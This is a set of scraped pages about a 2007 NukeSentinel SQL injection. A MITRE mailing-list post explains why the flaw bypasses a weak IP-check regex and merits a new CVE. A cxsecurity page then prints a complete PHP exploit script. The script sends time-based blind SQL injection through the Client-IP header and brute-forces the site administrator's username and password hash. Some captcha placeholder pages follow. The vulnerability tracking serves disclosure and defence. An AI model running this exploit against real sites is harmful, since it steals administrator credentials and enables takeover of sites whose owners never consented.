=== Content from attrition.org_adb5c58e_20250124_180938.html ===

# [VIM] SQL injection (x2) in NukeSentinel

**Heinbockel, Bill**
heinbockel at mitre.org

*Wed Mar 14 13:21:36 UTC 2007*

* Previous message: [[VIM] Apple megapatch plugs 45 security holes (fwd)](001428.html)
* Next message: [[VIM] [TRUE] Python 2.5 (Modules/zlib) minigzip local buffer overflow vulnerability](001430.html)
* **Messages sorted by:**
  [[ date ]](date.html#1429)
  [[ thread ]](thread.html#1429)
  [[ subject ]](subject.html#1429)
  [[ author ]](author.html#1429)

---

```

BUGTRAQ:20070310 NukeSentinel <= 2.5.06 SQL Injection (mysql >= 4.0.24)
Exploit
<http://www.securityfocus.com/archive/1/archive/1/462453/100/0/threaded>

Appears to be similar to CVE-2007-1172:
BUGTRAQ:20070220 NukeSentinel 2.5.05 (nukesentinel.php) File Disclosure
Exploit
<http://www.securityfocus.com/archive/1/archive/1/460599/100/0/threaded>

Both exploits are SQL injections and the code looks remarkably similar.
However, with the release of NukeSentinel 2.5.06, the vendor attempted
to
thwart CVE-2007-1172 with a weak regex --

In nukesentinel.php (line 61):
>
if(!ereg("^([0-9]{1,3})\\.([0-9]{1,3})\\.([0-9]{1,3})\\.([0-9]{1,3})",
$nsnst_const['remote_ip'])) {$nsnst_const['remote_ip'] = "none"; }

So, they are checking to ensure the Client-IP HTTP Header contains a
valid IP.
Hence, the newer exploit code prepends a random dotted-quad IP address
to the start
of the SQL injection. Therefore, this is viewed by CVE as a new
vulnerability and
will be assigned a new CVE.

William Heinbockel
Infosec Engineer
The MITRE Corporation
202 Burlington Rd. MS S145
Bedford, MA 01730
[heinbockel at mitre.org](http://www.attrition.org/mailman/listinfo/vim)
781-271-2615

```

---

* Previous message: [[VIM] Apple megapatch plugs 45 security holes (fwd)](001428.html)
* Next message: [[VIM] [TRUE] Python 2.5 (Modules/zlib) minigzip local buffer overflow vulnerability](001430.html)
* **Messages sorted by:**
  [[ date ]](date.html#1429)
  [[ thread ]](thread.html#1429)
  [[ subject ]](subject.html#1429)
  [[ author ]](author.html#1429)

---

[More information about the VIM
mailing list](http://www.attrition.org/mailman/listinfo/vim)



=== Content from cxsecurity.com_144c65be_20250126_024428.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from securityreason.com_2393aa8e_20250124_180939.html ===

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  | | **NukeSentinel <= 2.5.06 SQL Injection (mysql >= 4.0.24) Exploit** **2007.03.20** Credit:  **[DarkFig](https://cxsecurity.com/author/DarkFig/1/)**  Risk: **Medium** Local: **No** Remote: ****Yes**** CVE: **[CVE-2007-1493](https://cxsecurity.com/cveshow/CVE-2007-1493/ "Click to see CVE-2007-1493")** CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")**  CVSS Base Score: **7.5/10** Impact Subscore: **6.4/10** Exploitability Subscore: **10/10** Exploit range: **Remote** Attack complexity: **Low** Authentication: **No required** Confidentiality impact: **Partial** Integrity impact: **Partial** Availability impact: **Partial** | | --- | |
| --- | --- | --- | --- |

#!/usr/bin/php
<?php
/\*\*
\* This file require the PhpSploit class.
\* If you want to use this class, the latest
\* version can be downloaded from acid-root.new.fr.
\*\*/
require("phpsploitclass.php");
error\_reporting(E\_ALL ^ E\_NOTICE);
if($argc < 3)
{
print("
-- NukeSentinel <= 2.5.06 SQL Injection (mysql >= 4.0.24) Exploit ---
-----------------------------------------------------------------------
PHP conditions: none
CMS conditions: disable\_switch<=0 (module activated), track\_active=1
Credits: DarkFig <gmdarkfig (at) gmail (dot) com [email concealed]>
URL: http://www.acid-root.new.fr/
-----------------------------------------------------------------------
Usage: $argv[0] -url <> [Options]
Params: -url For example http://victim.com/webspell/
Options: -prefix Table prefix (default=nuke)
-debug Debug mod activated (debug\_ns.html)
-truetime Server response time which returns true
-benchmark You can change the value used in benchmark()
-proxy If you wanna use a proxy <proxyhost:proxyport>
-proxyauth Basic authentification <proxyuser:proxypwd>
Example: $argv[0] -url http://localhost/phpnuke/ -debug
Note: This exploit is based on the server response time
If you have some problems use -debug, -benchmark, -truetime
-----------------------------------------------------------------------
");exit(1);
}
$url = getparam("url",1);
$tblprfix = (getparam("prefix")!="") ? getparam("prefix") : 'nuke';
$debug = (getparam("debug")!="") ? 1 : 0;
$benchmark = (getparam("benchmark")!="") ? getparam("benchmark") : '100000000';
$proxy = getparam("proxy");
$proxyauth = getparam("proxyauth");
$xpl = new phpsploit();
$xpl->agent('Mozilla Firefox');
$xpl->allowredirection(0);
$xpl->cookiejar(0);
if($proxy) $xpl->proxy($proxy);
if($proxyauth) $xpl->proxyauth($proxyauth);
if($debug) debug(1);
print "nUsername: ";bruteforce('aid');
print "nPassword: ";bruteforce('pwd');
exit(0);
function bruteforce($field)
{
global $url,$xpl,$tblprfix,$truetime,$debug,$benchmark,$sql,$bef,$aft,$fak,$b,$
c,$f,$dfield,$a,$result;
$a=0;$v='';$dfield=$field;
if(eregi('a',$field)) { $b='-1';$c='127';} # aid charset
else { $b='46';$c='70'; } # pwd charset
while(TRUE)
{
$a++;
for($e=$b;$e<=$c;$e++)
{
$fak = rand(128,254).'.'
.rand(128,254).'.'
.rand(128,254).'.'
.rand(128,254);
if($e==$b) $f="TST";
elseif($e==($b+1)) $f="NULL";
else $f=$e;
# $db->sql\_query("INSERT INTO `".$prefix."\_nsnst\_tracked\_ips` (`user\_id`, `username`, `date`,
# `ip\_addr`, `ip\_long`, `page`, `user\_agent`, `refered\_from`, `x\_forward\_for`, `client\_ip`, `remote\_addr`,
# `remote\_port`, `request\_method`, `c2c`) VALUES ('".$nsnst\_const['ban\_user\_id']."', '$ban\_username2',
# '".$nsnst\_const['ban\_time']."', '".$nsnst\_const['remote\_ip']."', '".$nsnst\_const['remote\_long']."',
# '$pg', '$user\_agent', '$refered\_from', '".$nsnst\_const['forward\_ip']."', '".$nsnst\_const['client\_ip']."',
# '".$nsnst\_const['remote\_addr']."', '".$nsnst\_const['remote\_port']."', '".$nsnst\_const['request\_method']."',
# '$c2c')");
#
$sql = "(SELECT IF((SUBSTR(";
$sql .= ($f=="TST") ? "(SELECT 1)" : "(SELECT $field FROM ${tblprfix}\_authors WHERE radminsuper=1)";
$sql .= ($f=="TST") ? ",1" : ",$a";
$sql .= ",1)=CHAR(";
$sql .= ($f=="TST") ? "49" : "$f";
$sql .= ")),BENCHMARK($benchmark,CHAR(66))";
$sql .= ",1)),1,1,1,1,1,1,1,1,1)/\*";
$bef = time();
$xpl->reset("header");
# 2.5.06 CHANGES (2007-03-02):
# + Corrected a problem causing valid ip users to be tagged as invalid users
# ...The old sploit will not work for this version but it's always vulnerable, you missed something.
#
# if(!ereg("^([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})", $nsnst\_const['remote\_ip']))
# {$nsnst\_const['remote\_ip'] = "none"; }
#
$xpl->addheader("Client-IP","$fak',$sql");
$xpl->get($url);
$aft = time();
if($f=="TST") $truetime=($aft-$bef);
if(getparam("truetime")!="") $truetime = getparam("truetime");
if((($aft-$bef) >= $truetime) AND ($f != "TST")) $result='TRUE';
else $result='FALSE';
if($debug) debug();
if($result=='TRUE')
{
if($f != "NULL")
{
print strtolower(chr($f));
$v .= chr($f);
break;
}
else
{
return $v;
}
}
# Retry if no char found
if($f==$c) $a--;
}
}
}
function debug($first='')
{
global $tblprfix,$truetime,$debug,$benchmark,$sql,$bef,$aft,$fak,$b,$c,$f,$dfie
ld,$a,$result;
if($first)
{
$handle = fopen("debug\_ns.html","w+");
$data = "<h1><div align='center'>NukeSentinel <= 2.5.06 SQL Injection (Debug)</div></h1>
<pre><table width='0' border='1' align='center' cellspacing='0'><tr>
<td align='center'><b>REQUEST TIME</b></td>
<td align='center'><b>RESPONSE TIME</b></td>
<td align='center'><b>TRUETIME</b></td>
<td align='center'><b>BENCHMARK</b></td>
<td align='center'><b>RESULT</b></td>";
# <td align='center'><b>IP</b></td>
$data .= "<td align='center'><b>FIELD</b></td>
<td align='center'><b>CHARSET</b></td>
<td align='center'><b>SUBSTR()</b></td>
<td align='center'><b>ORD()</b></td>
<td align='center'><b>CHAR()</b></td>";
fwrite($handle,$data);
fclose($handle);
}
else
{
$handle = fopen("debug\_ns.html","a");
$data = "<tr";
$data .= ($result=='TRUE') ? " bgcolor='#FFFF00'" : "";
$data .= ">
<td align='center'> ".htmlentities($bef)." </td>
<td align='center'> ".htmlentities($aft)." </td>
<td align='center'> ".htmlentities($truetime)." </td>
<td align='center'> ".htmlentities($benchmark)." </td>
<td align='center'> ".htmlentities($result)." </td>";
# <td align='center'> ".htmlentities($fak)." </td>
$data .= "<td align='center'> ".htmlentities($dfield)." </td>
<td align='center'> ".htmlentities("$b-$c")." </td>
<td align='center'> ".htmlentities($a)." </td>
<td align='center'> ".htmlentities($f)." </td>
<td align='center'> ".htmlentities(chr($f))." </td></tr>";
fwrite($handle,$data);
fclose($handle);
}
}
function getparam($param,$opt='')
{
global $argv;
foreach($argv as $value => $key)
{
if($key == '-'.$param) {
if(!empty($argv[$value+1])) return $argv[$value+1];
else return 1;
}
}
if($opt) exit("n-$param parameter required");
else return;
}
?>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2007030128)
[Tweet](https://twitter.com/share)

Vote for this issue:

 0
 0

50%
50%

#### **Thanks for you vote!**

#### **Thanks for you comment!**Your message is in quarantine 48 hours.

Comment it here.
Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  | **{{ x.nick }}**  | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---  {{ x.comment }} |
| --- | --- |

Show all comments

---

Copyright **2025**, cxsecurity.com

  |  |
Back to Top



=== Content from cxsecurity.com_c5fb803d_20250126_024428.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from cxsecurity.com_c20a1966_20250126_024428.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---


